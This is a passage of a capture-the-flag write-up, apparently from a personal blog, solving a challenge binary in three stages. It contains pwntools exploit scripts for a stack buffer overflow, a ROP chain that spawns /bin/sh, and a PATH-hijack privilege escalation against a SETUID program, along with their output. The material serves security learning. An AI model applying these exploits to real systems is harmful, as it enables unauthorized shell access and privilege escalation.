printf(&lt;span style="color:#e6db74">&amp;#34;Hello %s&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>,&lt;span style="color:#f92672">&amp;amp;&lt;/span>local_38);
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Looks like a simple bof. We can directly find out the offset using GDB and &lt;code>cycle&lt;/code> from pwntools:&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ cyclic &lt;span style="color:#ae81ff">100&lt;/span>
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
$ gdb ./service
...
gefâž¤ r
Starting program: /home/vivescere/ctf/bof_1/service
hello who are you?
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
...
$rbp : 0x6161616e6161616d &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;maaanaaa&amp;#34;&lt;/span>?&lt;span style="color:#f92672">)&lt;/span>
...
&lt;span style="color:#f92672">[&lt;/span>!&lt;span style="color:#f92672">]&lt;/span> Cannot disassemble from $PC
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ threads â”€â”€â”€â”€
&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#75715e">#0] Id 1, Name: &amp;#34;service&amp;#34;, stopped 0x4019a8 in main (), reason: SIGSEGV&lt;/span>
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ trace â”€â”€â”€â”€
&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#75715e">#0] 0x4019a8 â†’ main()&lt;/span>
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
gefâž¤ q
$ cyclic -l 0x6161616e
&lt;span style="color:#ae81ff">52&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>We have the offset, and could probably use a ropchain to pop a shell. But that&amp;rsquo;s not the goal of this level. Using Ghidra again, we search for the flag format (&lt;code>CYBERTF{...}&lt;/code>). An interesting function pops up: &lt;code>magie&lt;/code>.&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">magie&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> param_1) {
&lt;span style="color:#66d9ef">int&lt;/span> iVar1;
undefined8 local_15;
undefined4 local_d;
undefined local_9;
local_15 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x7b46545245425943&lt;/span>;
local_d &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x7d595a59&lt;/span>;
local_9 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;span style="color:#66d9ef">if&lt;/span> ((param_1 &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>) &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> (iVar1 &lt;span style="color:#f92672">=&lt;/span> thunk_FUN_004010e6(&lt;span style="color:#e6db74">&amp;#34;CYBERTF{YZY}&amp;#34;&lt;/span>,&lt;span style="color:#f92672">&amp;amp;&lt;/span>local_15), iVar1 &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>)) {
puts(&lt;span style="color:#e6db74">&amp;#34;CYBERTF{_____________________}&amp;#34;&lt;/span>);
&lt;span style="color:#66d9ef">return&lt;/span>;
}
puts(&lt;span style="color:#e6db74">&amp;#34;Good Way&amp;#34;&lt;/span>);
&lt;span style="color:#66d9ef">return&lt;/span>;
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>CYBERTF{_____________________}&lt;/code> is replaced by the real flag when connecting to the challenge remotely. A check seems to be in place, but we can simply jump past it.&lt;/p>
&lt;p>After whipping out a quick script (using &lt;a href="https://github.com/io12/pwninit">pwninit&lt;/a>), we get the flag:&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e">#!/usr/bin/env python3&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> pwn &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
exe &lt;span style="color:#f92672">=&lt;/span> ELF(&lt;span style="color:#e6db74">&amp;#34;./service&amp;#34;&lt;/span>)
context&lt;span style="color:#f92672">.&lt;/span>binary &lt;span style="color:#f92672">=&lt;/span> exe
context&lt;span style="color:#f92672">.&lt;/span>terminal &lt;span style="color:#f92672">=&lt;/span> [&lt;span style="color:#e6db74">&amp;#39;konsole&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;-e&amp;#39;&lt;/span>]
&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">conn&lt;/span>():
&lt;span style="color:#66d9ef">if&lt;/span> args&lt;span style="color:#f92672">.&lt;/span>LOCAL:
r &lt;span style="color:#f92672">=&lt;/span> process([exe&lt;span style="color:#f92672">.&lt;/span>path])
&lt;span style="color:#66d9ef">else&lt;/span>:
r &lt;span style="color:#f92672">=&lt;/span> remote(&lt;span style="color:#e6db74">&amp;#34;XXX.XXX.XXX.XXX&amp;#34;&lt;/span>, &lt;span style="color:#ae81ff">00000&lt;/span>)
&lt;span style="color:#66d9ef">return&lt;/span> r
&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>():
r &lt;span style="color:#f92672">=&lt;/span> conn()
&lt;span style="color:#75715e"># Jump into magie, right where the function prints the flag&lt;/span>
offset &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">56&lt;/span>
r&lt;span style="color:#f92672">.&lt;/span>sendline(flat({offset: p64(&lt;span style="color:#ae81ff">0x4018da&lt;/span>)}))
&lt;span style="color:#66d9ef">print&lt;/span>(r&lt;span style="color:#f92672">.&lt;/span>recvall()&lt;span style="color:#f92672">.&lt;/span>decode(errors&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;ignore&amp;#39;&lt;/span>))
r&lt;span style="color:#f92672">.&lt;/span>close()
&lt;span style="color:#66d9ef">if&lt;/span> __name__ &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#34;__main__&amp;#34;&lt;/span>:
main()
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ python solve_basic.py LOCAL
&lt;span style="color:#f92672">[&lt;/span>*&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#e6db74">&amp;#39;/home/vivescere/ctf/bof_1/service&amp;#39;&lt;/span>
Arch: amd64-64-little
RELRO: Partial RELRO
Stack: Canary found
NX: NX enabled
PIE: No PIE &lt;span style="color:#f92672">(&lt;/span>0x400000&lt;span style="color:#f92672">)&lt;/span>
&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Starting local process &lt;span style="color:#e6db74">&amp;#39;/home/vivescere/ctf/bof_1/service&amp;#39;&lt;/span>: pid &lt;span style="color:#ae81ff">650148&lt;/span>
&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Receiving all data: Done &lt;span style="color:#f92672">(&lt;/span>116B&lt;span style="color:#f92672">)&lt;/span>
&lt;span style="color:#f92672">[&lt;/span>*&lt;span style="color:#f92672">]&lt;/span> Process &lt;span style="color:#e6db74">&amp;#39;/home/vivescere/ctf/bof_1/service&amp;#39;&lt;/span> stopped with exit code -7 &lt;span style="color:#f92672">(&lt;/span>SIGBUS&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">(&lt;/span>pid 650148&lt;span style="color:#f92672">)&lt;/span>
hello who are you?
Hello aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaa&lt;span style="color:#ae81ff">\x&lt;/span>&lt;span style="color:#ae81ff">18&lt;/span>
CYBERTF&lt;span style="color:#f92672">{&lt;/span>_____________________&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>The flag was &lt;code>CYBERTF{B@sic_Buff3r_Ov3rflow}&lt;/code>.&lt;/p>
&lt;h2 id="level-2-getshell">Level 2: GetShell&lt;/h2>
&lt;p>Our goal is now to pop a shell. We still have the NX bit on, so we could try using a ropchain. Since the CTF was short, I first tried to automatically generate one using &lt;code>ropper&lt;/code>:&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ ropper --file service --chain &lt;span style="color:#e6db74">&amp;#34;execve cmd=/bin/sh&amp;#34;&lt;/span>
...
&lt;/code>&lt;/pre>&lt;/div>&lt;p>The command worked, so I just plugged it into my previous script:&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e">#!/usr/bin/env python3&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> pwn &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> struct &lt;span style="color:#f92672">import&lt;/span> pack
exe &lt;span style="color:#f92672">=&lt;/span> ELF(&lt;span style="color:#e6db74">&amp;#34;./service&amp;#34;&lt;/span>)
context&lt;span style="color:#f92672">.&lt;/span>binary &lt;span style="color:#f92672">=&lt;/span> exe
context&lt;span style="color:#f92672">.&lt;/span>terminal &lt;span style="color:#f92672">=&lt;/span> [&lt;span style="color:#e6db74">&amp;#39;konsole&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;-e&amp;#39;&lt;/span>]
&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">gen_rop&lt;/span>():
p &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">lambda&lt;/span> x : pack(&lt;span style="color:#e6db74">&amp;#39;Q&amp;#39;&lt;/span>, x)
IMAGE_BASE_0 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x0000000000400000&lt;/span> &lt;span style="color:#75715e"># aae3c9732e164e7d4d0643ec3d3d8bd1f2a571dcb933e57afd11939c43984473&lt;/span>
rebase_0 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">lambda&lt;/span> x : p(x &lt;span style="color:#f92672">+&lt;/span> IMAGE_BASE_0)
rop &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span>
rop &lt;span style="color:#f92672">+=&lt;/span> rebase_0(&lt;span style="color:#ae81ff">0x000000000000962f&lt;/span>) &lt;span style="color:#75715e"># 0x000000000040962f: pop r13; ret; &lt;/span>
rop &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;//bin/sh&amp;#39;&lt;/span>
rop &lt;span style="color:#f92672">+=&lt;/span> rebase_0(&lt;span style="color:#ae81ff">0x0000000000001b2d&lt;/span>) &lt;span style="color:#75715e"># 0x0000000000401b2d: pop rbx; ret; &lt;/span>
rop &lt;span style="color:#f92672">+=&lt;/span> rebase_0(&lt;span style="color:#ae81ff">0x00000000000cc0e0&lt;/span>)
rop &lt;span style="color:#f92672">+=&lt;/span> rebase_0(&lt;span style="color:#ae81ff">0x00000000000715c2&lt;/span>) &lt;span style="color:#75715e"># 0x00000000004715c2: mov qword ptr [rbx], r13; pop rbx; pop rbp; pop r12; pop r13; ret; &lt;/span>
rop &lt;span style="color:#f92672">+=&lt;/span> p(&lt;span style="color:#ae81ff">0xdeadbeefdeadbeef&lt;/span>)
rop &lt;span style="color:#f92672">+=&lt;/span> p(&lt;span style="color:#ae81ff">0xdeadbeefdeadbeef&lt;/span>)
rop &lt;span style="color:#f92672">+=&lt;/span> p(&lt;span style="color:#ae81ff">0xdeadbeefdeadbeef&lt;/span>)
rop &lt;span style="color:#f92672">+=&lt;/span> p(&lt;span style="color:#ae81ff">0xdeadbeefdeadbeef&lt;/span>)
rop &lt;span style="color:#f92672">+=&lt;/span> rebase_0(&lt;span style="color:#ae81ff">0x000000000000962f&lt;/span>) &lt;span style="color:#75715e"># 0x000000000040962f: pop r13; ret; &lt;/span>
rop &lt;span style="color:#f92672">+=&lt;/span> p(&lt;span style="color:#ae81ff">0x0000000000000000&lt;/span>)
rop &lt;span style="color:#f92672">+=&lt;/span> rebase_0(&lt;span style="color:#ae81ff">0x0000000000001b2d&lt;/span>) &lt;span style="color:#75715e"># 0x0000000000401b2d: pop rbx; ret; &lt;/span>
rop &lt;span style="color:#f92672">+=&lt;/span> rebase_0(&lt;span style="color:#ae81ff">0x00000000000cc0e8&lt;/span>)
rop &lt;span style="color:#f92672">+=&lt;/span> rebase_0(&lt;span style="color:#ae81ff">0x00000000000715c2&lt;/span>) &lt;span style="color:#75715e"># 0x00000000004715c2: mov qword ptr [rbx], r13; pop rbx; pop rbp; pop r12; pop r13; ret; &lt;/span>
rop &lt;span style="color:#f92672">+=&lt;/span> p(&lt;span style="color:#ae81ff">0xdeadbeefdeadbeef&lt;/span>)
rop &lt;span style="color:#f92672">+=&lt;/span> p(&lt;span style="color:#ae81ff">0xdeadbeefdeadbeef&lt;/span>)
rop &lt;span style="color:#f92672">+=&lt;/span> p(&lt;span style="color:#ae81ff">0xdeadbeefdeadbeef&lt;/span>)
rop &lt;span style="color:#f92672">+=&lt;/span> p(&lt;span style="color:#ae81ff">0xdeadbeefdeadbeef&lt;/span>)
rop &lt;span style="color:#f92672">+=&lt;/span> rebase_0(&lt;span style="color:#ae81ff">0x0000000000001ece&lt;/span>) &lt;span style="color:#75715e"># 0x0000000000401ece: pop rdi; ret; &lt;/span>
rop &lt;span style="color:#f92672">+=&lt;/span> rebase_0(&lt;span style="color:#ae81ff">0x00000000000cc0e0&lt;/span>)
rop &lt;span style="color:#f92672">+=&lt;/span> rebase_0(&lt;span style="color:#ae81ff">0x000000000000880e&lt;/span>) &lt;span style="color:#75715e"># 0x000000000040880e: pop rsi; ret; &lt;/span>
rop &lt;span style="color:#f92672">+=&lt;/span> rebase_0(&lt;span style="color:#ae81ff">0x00000000000cc0e8&lt;/span>)
rop &lt;span style="color:#f92672">+=&lt;/span> rebase_0(&lt;span style="color:#ae81ff">0x000000000008ef5b&lt;/span>) &lt;span style="color:#75715e"># 0x000000000048ef5b: pop rdx; pop rbx; ret; &lt;/span>
rop &lt;span style="color:#f92672">+=&lt;/span> rebase_0(&lt;span style="color:#ae81ff">0x00000000000cc0e8&lt;/span>)
rop &lt;span style="color:#f92672">+=&lt;/span> p(&lt;span style="color:#ae81ff">0xdeadbeefdeadbeef&lt;/span>)
rop &lt;span style="color:#f92672">+=&lt;/span> rebase_0(&lt;span style="color:#ae81ff">0x000000000000302c&lt;/span>) &lt;span style="color:#75715e"># 0x000000000040302c: pop rax; ret; &lt;/span>
rop &lt;span style="color:#f92672">+=&lt;/span> p(&lt;span style="color:#ae81ff">0x000000000000003b&lt;/span>)
rop &lt;span style="color:#f92672">+=&lt;/span> rebase_0(&lt;span style="color:#ae81ff">0x000000000001ca64&lt;/span>) &lt;span style="color:#75715e"># 0x000000000041ca64: syscall; ret; &lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> rop
&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">conn&lt;/span>():
&lt;span style="color:#66d9ef">if&lt;/span> args&lt;span style="color:#f92672">.&lt;/span>LOCAL:
r &lt;span style="color:#f92672">=&lt;/span> process([exe&lt;span style="color:#f92672">.&lt;/span>path])
&lt;span style="color:#66d9ef">else&lt;/span>:
r &lt;span style="color:#f92672">=&lt;/span> remote(&lt;span style="color:#e6db74">&amp;#34;XXX.XXX.XXX.XXX&amp;#34;&lt;/span>, &lt;span style="color:#ae81ff">00000&lt;/span>)
&lt;span style="color:#66d9ef">return&lt;/span> r
&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>():
r &lt;span style="color:#f92672">=&lt;/span> conn()
wanted &lt;span style="color:#f92672">=&lt;/span> p64(&lt;span style="color:#ae81ff">0x401885&lt;/span>)
offset &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">56&lt;/span>
r&lt;span style="color:#f92672">.&lt;/span>recvuntil(&lt;span style="color:#e6db74">&amp;#39;?&amp;#39;&lt;/span>)
r&lt;span style="color:#f92672">.&lt;/span>recvline()
r&lt;span style="color:#f92672">.&lt;/span>sendline(flat({offset: gen_rop()}))
r&lt;span style="color:#f92672">.&lt;/span>recvline()
r&lt;span style="color:#f92672">.&lt;/span>interactive()
&lt;span style="color:#66d9ef">if&lt;/span> __name__ &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#34;__main__&amp;#34;&lt;/span>:
main()
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ python solve.py LOCAL
&lt;span style="color:#f92672">[&lt;/span>*&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#e6db74">&amp;#39;/home/vivescere/ctf/bof_1/service&amp;#39;&lt;/span>
Arch: amd64-64-little
RELRO: Partial RELRO
Stack: Canary found
NX: NX enabled
PIE: No PIE &lt;span style="color:#f92672">(&lt;/span>0x400000&lt;span style="color:#f92672">)&lt;/span>
&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Starting local process &lt;span style="color:#e6db74">&amp;#39;/home/vivescere/ctf/bof_1/service&amp;#39;&lt;/span>: pid &lt;span style="color:#ae81ff">682309&lt;/span>
&lt;span style="color:#f92672">[&lt;/span>*&lt;span style="color:#f92672">]&lt;/span> Switching to interactive mode
$ pwd
/home/vivescere/ctf/bof_1
&lt;/code>&lt;/pre>&lt;/div>&lt;p>And it worked! The flag was in &lt;code>/home/ctf/flag.txt&lt;/code>: &lt;code>CYBERTF{B@sic_R0PChain}&lt;/code>.&lt;/p>
&lt;h2 id="level-3-privesc">Level 3: PrivEsc&lt;/h2>
&lt;p>I started looking around the filesystem, and quickly found a SETUID binary: &lt;code>/bin/check&lt;/code>. I didn&amp;rsquo;t have a way to download it using SCP, so I patched the exploit to do it instead:&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>():
r &lt;span style="color:#f92672">=&lt;/span> conn()
wanted &lt;span style="color:#f92672">=&lt;/span> p64(&lt;span style="color:#ae81ff">0x401885&lt;/span>)
offset &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">56&lt;/span>
r&lt;span style="color:#f92672">.&lt;/span>recvuntil(&lt;span style="color:#e6db74">&amp;#39;?&amp;#39;&lt;/span>)
r&lt;span style="color:#f92672">.&lt;/span>recvline()
r&lt;span style="color:#f92672">.&lt;/span>sendline(flat({offset: gen_rop()}))
r&lt;span style="color:#f92672">.&lt;/span>recvline()
&lt;span style="color:#66d9ef">with&lt;/span> open(&lt;span style="color:#e6db74">&amp;#39;check&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;wb&amp;#39;&lt;/span>) &lt;span style="color:#66d9ef">as&lt;/span> f:
r&lt;span style="color:#f92672">.&lt;/span>sendline(&lt;span style="color:#e6db74">&amp;#39;cat /bin/check&amp;#39;&lt;/span>)
r&lt;span style="color:#f92672">.&lt;/span>sendline(&lt;span style="color:#e6db74">&amp;#39;exit&amp;#39;&lt;/span>)
f&lt;span style="color:#f92672">.&lt;/span>write(r&lt;span style="color:#f92672">.&lt;/span>recvall())
&lt;/code>&lt;/pre>&lt;/div>&lt;p>I then decompiled the main function using Ghidra:&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">undefined8 &lt;span style="color:#a6e22e">main&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>) {
&lt;span style="color:#66d9ef">int&lt;/span> iVar1;
undefined8 uVar2;
size_t sVar3;
&lt;span style="color:#66d9ef">long&lt;/span> lVar4;
undefined8 &lt;span style="color:#f92672">*&lt;/span>puVar5;
&lt;span style="color:#66d9ef">long&lt;/span> in_FS_OFFSET;
byte bVar6;
undefined8 local_420;
undefined8 local_418;
undefined8 local_410;
undefined8 local_408 [&lt;span style="color:#ae81ff">127&lt;/span>];
&lt;span style="color:#66d9ef">long&lt;/span> local_10;
bVar6 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
local_10 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)(in_FS_OFFSET &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x28&lt;/span>);
setreuid(&lt;span style="color:#ae81ff">0x3e9&lt;/span>,&lt;span style="color:#ae81ff">0x3e9&lt;/span>);
local_418 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
local_410 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
lVar4 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x7e&lt;/span>;
puVar5 &lt;span style="color:#f92672">=&lt;/span> local_408;
&lt;span style="color:#66d9ef">while&lt;/span> (lVar4 &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>) {
lVar4 &lt;span style="color:#f92672">=&lt;/span> lVar4 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>;
&lt;span style="color:#f92672">*&lt;/span>puVar5 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
puVar5 &lt;span style="color:#f92672">=&lt;/span> puVar5 &lt;span style="color:#f92672">+&lt;/span> (ulong)bVar6 &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>;
}
local_420 &lt;span style="color:#f92672">=&lt;/span> popen(&lt;span style="color:#e6db74">&amp;#34;md5sum /home/ctf_cracked/flag.txt | cut -d &lt;/span>&lt;span style="color:#ae81ff">\&amp;#39;&lt;/span>&lt;span style="color:#e6db74"> &lt;/span>&lt;span style="color:#ae81ff">\&amp;#39;&lt;/span>&lt;span style="color:#e6db74"> -f 1&amp;#34;&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;r&amp;#34;&lt;/span>);
&lt;span style="color:#66d9ef">if&lt;/span> (local_420 &lt;span style="color:#f92672">==&lt;/span> (FILE &lt;span style="color:#f92672">*&lt;/span>)&lt;span style="color:#ae81ff">0x0&lt;/span>) {
puts(&lt;span style="color:#e6db74">&amp;#34;Command Failed&amp;#34;&lt;/span>);
uVar2 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>;
}
&lt;span style="color:#66d9ef">else&lt;/span> {
fgets((&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)&lt;span style="color:#f92672">&amp;amp;&lt;/span>local_418,&lt;span style="color:#ae81ff">0x400&lt;/span>,local_420);
sVar3 &lt;span style="color:#f92672">=&lt;/span> strlen((&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)&lt;span style="color:#f92672">&amp;amp;&lt;/span>local_418);
&lt;span style="color:#f92672">*&lt;/span>(undefined &lt;span style="color:#f92672">*&lt;/span>)((&lt;span style="color:#66d9ef">long&lt;/span>)&lt;span style="color:#f92672">&amp;amp;&lt;/span>local_420 &lt;span style="color:#f92672">+&lt;/span> sVar3 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">7&lt;/span>) &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
iVar1 &lt;span style="color:#f92672">=&lt;/span> strcmp((&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)&lt;span style="color:#f92672">&amp;amp;&lt;/span>local_418,&lt;span style="color:#e6db74">&amp;#34;8b098e9d5692641375f8da6d399edf98&amp;#34;&lt;/span>);
&lt;span style="color:#66d9ef">if&lt;/span> (iVar1 &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>) {
puts(&lt;span style="color:#e6db74">&amp;#34;All is clear&amp;#34;&lt;/span>);
}
&lt;span style="color:#66d9ef">else&lt;/span> {
puts(&lt;span style="color:#e6db74">&amp;#34;Contact Administrator&amp;#34;&lt;/span>);
}
uVar2 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
}
&lt;span style="color:#66d9ef">if&lt;/span> (local_10 &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)(in_FS_OFFSET &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x28&lt;/span>)) {
&lt;span style="color:#75715e">/* WARNING: Subroutine does not return */&lt;/span>
__stack_chk_fail();
}
&lt;span style="color:#66d9ef">return&lt;/span> uVar2;
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>The file containing the flag is (of course) not directly readable, but the owner is the same as the binary owner: &lt;code>ctf_cracked&lt;/code>. The program executes a command. We can abuse this by editing the PATH before launching the binary:&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ cd /tmp
$ mkdir solution
$ echo &lt;span style="color:#e6db74">&amp;#39;#!/bin/bash&amp;#39;&lt;/span> &amp;gt;&amp;gt; md5sum
$ echo &lt;span style="color:#e6db74">&amp;#39;cat /home/ctf_cracked/flag.txt &amp;gt; /tmp/solution/flag.txt&amp;#39;&lt;/span> &amp;gt;&amp;gt; md5sum
$ PATH&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#66d9ef">$(&lt;/span>pwd&lt;span style="color:#66d9ef">)&lt;/span>:/bin check
$ cat /tmp/solution/flag.txt
&lt;/code>&lt;/pre>&lt;/div>&lt;p>The flag was &lt;code>CYBERTF{B@sicPrivEsc(Anti_Gu3ssing)}&lt;/code>.&lt;/p>
&lt;h2 id="more">More&lt;/h2>
